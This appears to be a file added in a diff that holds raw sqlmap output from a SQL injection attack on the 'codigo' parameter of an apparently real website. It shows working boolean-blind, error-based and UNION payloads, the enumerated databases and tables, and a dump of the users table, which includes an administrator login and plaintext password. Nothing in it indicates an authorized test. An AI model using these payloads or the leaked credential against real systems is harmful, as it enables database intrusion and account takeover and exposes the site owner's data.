@@ -1,0 +1,87 @@
+sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=1 AND 9757=9757
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=1 AND (SELECT 3170 FROM(SELECT COUNT(*),CONCAT(0x71626b7a71,(SELECT (ELT(3170=3170,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: codigo=-8981 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7a71,0x4b5062454f5942727176454e566d7a4e576379557642766d6a476c67715073614c76415041426f6f,0x7176767671),NULL,NULL-- tdTs
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] clarissaberti
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=1 AND 9757=9757
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=1 AND (SELECT 3170 FROM(SELECT COUNT(*),CONCAT(0x71626b7a71,(SELECT (ELT(3170=3170,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: codigo=-8981 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7a71,0x4b5062454f5942727176454e566d7a4e576379557642766d6a476c67715073614c76415041426f6f,0x7176767671),NULL,NULL-- tdTs
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: clarissaberti
+[9 tables]
++------------------------+
+| tbl_dicas              |
+| tbl_disturbios         |
+| tbl_fotos_galeria      |
+| tbl_newsletter         |
+| tbl_programas          |
+| tbl_programas_usuarios |
+| tbl_subcategoria_trata |
+| tbl_tratamentos        |
+| tbl_usuarios           |
++------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: codigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: codigo=1 AND 9757=9757
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: codigo=1 AND (SELECT 3170 FROM(SELECT COUNT(*),CONCAT(0x71626b7a71,(SELECT (ELT(3170=3170,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: codigo=-8981 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7a71,0x4b5062454f5942727176454e566d7a4e576379557642766d6a476c67715073614c76415041426f6f,0x7176767671),NULL,NULL-- tdTs
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: clarissaberti
+Table: tbl_usuarios
+[1 entry]
++------+---------------+-----------+-------+-------+--------+
+| tipo | nome          | senha     | login | email | codigo |
++------+---------------+-----------+-------+-------+--------+
+| N    | Administrador | berti2013 | admin | NULL  | 1      |
++------+---------------+-----------+-------+-------+--------+
+
